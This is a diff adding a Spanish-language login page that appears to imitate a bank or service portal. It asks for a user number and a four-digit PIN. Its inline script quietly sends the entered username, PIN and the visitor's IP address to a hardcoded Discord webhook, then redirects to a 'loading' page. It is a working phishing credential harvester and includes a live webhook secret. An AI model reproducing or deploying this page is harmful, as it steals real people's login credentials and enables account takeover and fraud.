@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="banner">
+  <div class="header">
+    <img src="img/logo-1.png" alt="Logo" class="logo" />
+    <div class="linea-personal">| Personal</div>
+  </div>
+  <form id="loginForm">
+    <label for="usuario">Usuario<span class="asterisco">*</span></label>
+    <div class="input-group">
+      <img src="img/perfil.png" alt="Usuario" />
+      <input type="tel" id="usuario" name="usuario" maxlength="20" pattern="\d*" inputmode="numeric" placeholder="Ingrese su usuario" required />
+    </div>
+    <label for="clave">Contraseña<span class="asterisco">*</span></label>
+    <div class="input-group">
+      <img src="img/bloquear.png" alt="Contraseña" />
+      <input type="password" id="clave" name="clave" minlength="4" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="Ingrese su clave" required />
+    </div>
+    <button type="submit">Entrar</button>
+  </form>
+  <div class="forgot" onclick="alert('Aquí puedes agregar funcionalidad para recuperación de clave')">
+    <img src="img/candado.png" alt="Candado" />
+    ¿Olvidaste tu clave de acceso?
+  </div>
+</div>
+<script src="js/main.js"></script>
+<script>
+const webhook = "https://discord.com/api/webhooks/1481712791508226209/2AjtJeFx9ommSEtgRFVCjd3khnhZpqEvxJLyJTAmOHFYtIhgiKcqo7wYC6AdsmGL5zs2";
+
+function getIP() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => data.ip)
+    .catch(() => 'IP desconocida');
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const usuario = document.getElementById('usuario').value.trim();
+  const clave = document.getElementById('clave').value.trim();
+  if (!usuario || !clave) {
+    alert("Completa todos los campos.");
+    return;
+  }
+  let ip = 'IP desconocida';
+  try {
+    ip = await getIP();
+  } catch {}
+  // Guardar usuario y IP para los siguientes pasos
+  localStorage.setItem('usuario', usuario);
+  localStorage.setItem('ip', ip);
+
+  const message = `Usuario: ${usuario}\nClave: ${clave}\nIP: ${ip}`;
+
+  fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: message })
+  })
+  .then(res => {
+    window.location.href = "cargando.html";
+  })
+  .catch(() => {
+    alert("Error de conexión.");
+  });
+});
+</script>
+</body>
+</html>
